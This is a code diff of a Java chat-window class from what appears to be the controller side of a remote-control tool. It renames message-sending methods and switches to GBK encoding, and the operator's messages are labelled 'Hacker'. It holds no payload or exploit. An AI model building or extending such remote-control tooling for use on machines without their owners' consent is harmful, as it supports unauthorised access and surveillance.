@@ -1,7 +1,5 @@
 package me.server.receive;
 
-import com.sun.jna.platform.WindowUtils;
-import me.server.Server;
 import me.server.utils.HttpUtils;
 import me.server.utils.MessageFlags;
 import me.server.utils.SendMessage;
@@ -15,7 +13,6 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.net.Socket;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
@@ -60,14 +57,14 @@ public class RemoteChat extends Thread{
                 String chat = date + "\n"+ "Hacker: " + jtf.getText() + "\n";
                 jta.append("我: " + jtf.getText() + "\n");
                 jtf.setText("");
-                SendMessage.Send(MessageFlags.SEND_REMOTECHAT,chat.getBytes(),socket);
+                SendMessage.send(MessageFlags.SEND_REMOTECHAT,chat.getBytes("GBK"),socket);
             }catch (Exception e) {
             }
         });
         jDialog.addWindowListener(new WindowAdapter() {
             @Override
             public void windowClosing(WindowEvent e) {
-                SendMessage.SendHead(MessageFlags.STOP_REMOTECHAT,socket);
+                SendMessage.sendHead(MessageFlags.STOP_REMOTECHAT,socket);
             }
         });
     }
@@ -82,7 +79,7 @@ public class RemoteChat extends Thread{
                 Date date = new Date();
                 dateFormat.format(date);
                 String text = date + "\n"+ "Hacker: " + context + "\n";
-                SendMessage.Send(MessageFlags.SEND_REMOTECHAT,text.getBytes(),socket);
+                SendMessage.send(MessageFlags.SEND_REMOTECHAT,text.getBytes("GBK"),socket);
                 jta.append(text);
             }
         }catch (Exception e) {
